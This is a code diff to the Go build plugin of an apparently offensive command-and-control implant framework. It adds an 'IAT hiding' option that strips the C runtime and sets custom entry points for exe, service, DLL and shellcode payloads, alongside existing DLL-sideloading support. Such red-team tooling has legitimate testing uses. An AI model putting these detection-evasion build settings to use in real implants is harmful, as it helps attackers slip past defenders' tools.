@@ -276,6 +276,7 @@ type GenerateConfig struct {
 	IsWorkingTime      bool   `json:"is_workingtime"`
 	StartTime          string `json:"start_time"`
 	EndTime            string `json:"end_time"`
+	IatHiding          bool   `json:"iat_hiding"`
 	IsSideloading      bool   `json:"is_sideloading"`
 	SideloadingContent string `json:"sideloading_content"`
 	DnsResolvers       string `json:"dns_resolvers"`
@@ -296,7 +297,7 @@ var (
 	ObjectDir_smb  = "objects_smb"
 	ObjectDir_tcp  = "objects_tcp"
 	ObjectDir_dns  = "objects_dns"
-	ObjectFiles    = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "Boffer", "Commander", "Crypt", "Downloader", "Encoders", "JobsController", "MainAgent", "MemorySaver", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
+	ObjectFiles    = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "Boffer", "Commander", "crt", "Crypt", "Downloader", "Encoders", "JobsController", "MainAgent", "MemorySaver", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
 	CFlags         = "-c -fno-builtin -fno-unwind-tables -fno-strict-aliasing -fno-ident -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables -fno-strict-overflow -fno-delete-null-pointer-checks -fpermissive -w -masm=intel -fPIC"
 	LFlags         = "-Os -s -Wl,-s,--gc-sections -static-libgcc -mwindows"
 )
@@ -582,10 +583,17 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 
 	cFlags := CFlags
 	lFlags := LFlags
+	postLibs := ""
 
 	err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig)
 	if err != nil {
 		return nil, "", err
+	}
+
+	// IAT Hiding: -nostdlib eliminates CRT, custom crt.cpp provides replacements
+	if generateConfig.IatHiding {
+		cFlags += " -DIAT_HIDING"
+		lFlags += " -nostdlib -nostartfiles -nodefaultlibs"
 	}
 
 	currentDir := ModuleDir
@@ -659,15 +667,38 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		Files += ObjectDir + "/main" + Ext
 		buildPath = tempDir + "/file.exe"
 		Filename += ".exe"
+		if generateConfig.IatHiding {
+			if generateConfig.Arch == "x86" {
+				lFlags += " -Wl,-e,_WinMain@16"
+			} else {
+				lFlags += " -Wl,-e,WinMain"
+			}
+		}
 	} else if generateConfig.Format == "Service Exe" {
 		Files += ObjectDir + "/main_service" + Ext
 		buildPath = tempDir + "/svc.exe"
 		Filename = "svc_" + Filename + ".exe"
+		if generateConfig.IatHiding {
+			postLibs += " -ladvapi32"
+			if generateConfig.Arch == "x86" {
+				lFlags += " -Wl,-e,_main"
+			} else {
+				lFlags += " -Wl,-e,main"
+			}
+		}
 	} else if generateConfig.Format == "DLL" {
 		Files += ObjectDir + "/main_dll" + Ext
 		lFlags += " -shared"
 		buildPath = tempDir + "/file.dll"
 		Filename += ".dll"
+		if generateConfig.IatHiding {
+			postLibs += " -lkernel32"
+			if generateConfig.Arch == "x86" {
+				lFlags += " -Wl,-e,_DllMain@12"
+			} else {
+				lFlags += " -Wl,-e,DllMain"
+			}
+		}
 		if generateConfig.IsSideloading {
 			sideloadingContent, err := base64.StdEncoding.DecodeString(generateConfig.SideloadingContent)
 			if err != nil {
@@ -684,6 +715,13 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		lFlags += " -shared"
 		buildPath = tempDir + "/file.dll"
 		Filename += ".bin"
+		if generateConfig.IatHiding {
+			if generateConfig.Arch == "x86" {
+				lFlags += " -Wl,-e,_DllMain@12"
+			} else {
+				lFlags += " -Wl,-e,DllMain"
+			}
+		}
 	} else {
 		_ = os.RemoveAll(tempDir)
 		return nil, "", errors.New("unknown file format")
@@ -694,6 +732,9 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	var buildArgs []string
 	buildArgs = append(buildArgs, strings.Fields(lFlags)...)
 	buildArgs = append(buildArgs, strings.Fields(Files)...)
+	if postLibs != "" {
+		buildArgs = append(buildArgs, strings.Fields(postLibs)...)
+	}
 	buildArgs = append(buildArgs, "-o", buildPath)
 
 	err = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, Compiler, buildArgs...)
